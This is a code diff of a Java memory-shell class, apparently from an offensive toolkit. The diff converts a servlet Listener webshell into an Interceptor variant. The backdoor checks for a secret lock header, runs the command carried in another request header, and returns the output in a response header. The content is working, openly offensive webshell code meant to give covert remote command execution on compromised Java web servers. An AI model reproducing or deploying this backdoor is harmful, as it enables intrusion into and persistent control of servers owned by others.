@@ -12,85 +12,39 @@ import java.lang.reflect.Method;
 /**
  * @author Whoopsunix
  */
-@MemShell(MemShell.Listener)
+@MemShell(MemShell.Interceptor)
 @MemShellFunction(MemShellFunction.Exec)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
-public class ListenerExec implements InvocationHandler {
+public class InterceptorExec implements InvocationHandler {
     private static String HEADER;
     private static String RHEADER;
-
     private static String lockHeaderKey;
     private static String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
-        if (method.getName().equals("requestInitialized")) {
-            run(args[0]);
-        } else if (method.getName().equals("equals")) {
-            return this.equals(args[0]);
+        if (method.getName().equals("preHandle")) {
+            return run(args[0], args[1], args[2]);
         }
         return null;
     }
 
-    public Object getResponse(Object request) throws Exception {
-        return null;
-    }
-
-    /**
-     * tomcat
-     */
-//    public Object getResponse(Object request) throws Exception {
-//        try {
-//            request = getFieldValue(request, "request");
-//        }catch (Exception e){
-//        }
-//        Object httpServletResponse = getFieldValue(request, "response");
-//        return httpServletResponse;
-//    }
-
-    /**
-     * Jetty
-     */
-//    public Object getResponse(Object request) throws Exception {
-//        return invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
-//    }
-
-    /**
-     * Undertow
-     */
-//    public Object getResponse(Object request) throws Exception {
-//        Object exchange = getFieldValue(request, "exchange");
-//        Map attachments = (Map) getFieldValue(exchange, "attachments");
-//        Object[] tables = (Object[]) getFieldValue(attachments, "table");
-//        for (int i = 0; i < tables.length; i++) {
-//            try {
-//                Object table = tables[i];
-//                if (table == null)
-//                    continue;
-//                if (table.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
-//                    return getFieldValue(table, "originalResponse");
-//                }
-//            } catch (Exception e) {
-//            }
-//        }
-//        return null;
-//    }
-    private void run(Object sre) {
+    private boolean run(Object request, Object response, Object handler) {
         try {
-            Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
             String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
             if (lv == null || !lv.contains(lockHeaderValue)) {
-                return;
+                return true;
             }
 
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             String result = exec((String) header);
-            Object response = getResponse(request);
             invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+            return false;
 //            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
 //            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
 //            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
         } catch (Throwable ignored) {
         }
+        return true;
     }
 
     public static String exec(String str) throws Exception {
